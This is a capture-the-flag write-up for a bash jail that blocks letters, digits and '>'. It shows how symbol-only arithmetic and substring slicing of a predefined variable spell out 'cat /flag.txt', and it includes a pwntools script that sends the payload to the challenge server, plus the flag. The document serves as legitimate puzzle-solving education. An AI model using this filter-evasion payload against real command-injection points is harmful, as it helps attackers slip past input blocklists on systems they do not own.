# Muted-Deaf-Prision

**Category:** MISC
**Flag:** `HackOn{n0_W00rD5}`

## Description

> Me han vuelto a pillar, esta vez estoy jodido de verdad, me ha vendado los ojos y ya no veo nada.
> Flag format: HackOn{^[a-zA-Z0-9]}

## TL;DR

Bash jail that filters alphanumeric characters and `>`. Escaped by extracting characters from a pre-defined variable `$__` using symbol-only arithmetic to build `cat /flag.txt`.

## Analysis

The challenge provides a shell inside nsjail with the following restrictions:

1. **No alphanumerics:** Any input containing `[a-zA-Z0-9]` is rejected
2. **No redirection:** The `>` character is forbidden
3. **Silenced stderr:** `eval "$input" 2>/dev/null`

But the jail gives us a crucial hint: it defines a variable with ALL alphanumeric characters:

```bash
export __="abcdefghijklmnopqrsleeptuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}?-#"
```

The key is using `${__:position:length}` to extract individual characters, where the position is calculated arithmetically without using digits.

### Relevant position map

| Char | Position | Calculation |
|------|----------|-------------|
| a | 0 | `$(())` |
| c | 2 | `____` (=2) |
| f | 5 | `_______` (=5) |
| g | 6 | `_______+___` (5+1) |
| l | 11 | `______+______+_____` (4+4+3) |
| t | 23 | `______*_______+_____` (4×5+3) |
| x | 27 | `_______*_______+____` (5×5+2) |

### Generating numbers without digits

```
$(())           → 0  (empty arithmetic)
$((-~$(())))    → 1  (bitwise NOT of 0 = -1, negated = 1)
$((___+___))    → 2
$((____+___))   → 3
$((____+____))  → 4
$((_____+____)) → 5
```

## Solution

### Prerequisites

```bash
pip install pwntools --break-system-packages
```

### Steps

1. Define numeric variables using only underscores and arithmetic operators
2. Extract characters from `$__` with `${__:pos:len}` to build `cat /flag.txt`
3. The entire payload is sent in one line, `eval` executes it

### Solve Script

```python
#!/usr/bin/env python3
# solve.py: Muted-Deaf-Prision solver
from pwn import *

HOST = "0.cloud.chals.io"
PORT = 31351

payload = (
    '___=$((-~$(())))  ;'
    '____=$((___+___));'
    '_____=$((____+___));'
    '______=$((____+____));'
    '_______=$((_____+____));'
    '${__:____:___}'                          # c
    '${__:$(()):___}'                         # a
    '${__:$((______*_______+_____)):___}'     # t
    ' /'
    '${__:_______:___}'                       # f
    '${__:$((______+______+_____)):___}'      # l
    '${__:$(()):___}'                         # a
    '${__:$((_______+___)):___}'              # g
    '.'
    '${__:$((______*_______+_____)):___}'     # t
    '${__:$((_______*_______+____)):___}'     # x
    '${__:$((______*_______+_____)):___}'     # t
)

r = remote(HOST, PORT)
r.recvuntil(b">> ")
r.sendline(payload.encode())
print(r.recvall(timeout=10).decode(errors='replace'))
r.close()
```

## Flag

```
HackOn{n0_W00rD5}
```
